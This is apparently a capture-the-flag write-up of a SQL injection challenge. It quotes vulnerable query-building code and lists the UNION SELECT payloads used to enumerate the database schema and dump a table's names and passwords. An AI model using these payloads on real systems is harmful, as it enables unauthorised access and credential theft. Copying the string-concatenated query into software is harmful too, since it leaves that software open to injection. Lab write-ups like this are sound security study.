# SQLI1

## General information 
url: http://vuln2.redrocket.club:12347/

given: 
cursor.execute("SELECT id, title, content FROM articles WHERE public=1 AND id=" + request.form["article_id"])

query: 
SELECT id, title, content FROM articles WHERE public=1 AND id=" + request.form["article_id"]

## Try 1: or 1
' OR 1 # didn't work 

## Try 2: Union method 

### try union method: 

show article id 1
-1 UNION SELECT id, title, content FROM articles LIMIT 0,1
bzw. 
0 UNION SELECT id, title, content FROM articles LIMIT 0,1

shows article id 2
-1 UNION SELECT id, title, content FROM articles LIMIT 1,2
bzw. 
0 UNION SELECT id, title, content FROM articles LIMIT 1,2

### Systematically get information about database: 

#### query schematas: 
0 union select schema_name, 2, 3 from information_schema.schemata LIMIT 0,1

schemata: 
mysql
information_schema
performance_schema
sys
news

#### query tables from the news schema: 
0 union select table_name, 2, 3 from information_schema.tables where table_schema='news' limit 0,1

tables in schema news: 
articles
userdatathatisvaluable

#### columns in table userdatathatisvaluable: 
0 union select column_name, 2, 3 from information_schema.columns where table_name="userdatathatisvaluable" limit 0,1

columns in userdatathatisvaluable: 
id 
name 
password 

#### hack userdatathatisvaluable: 
0 union select id, name, password from userdatathatisvaluable limit 0,1






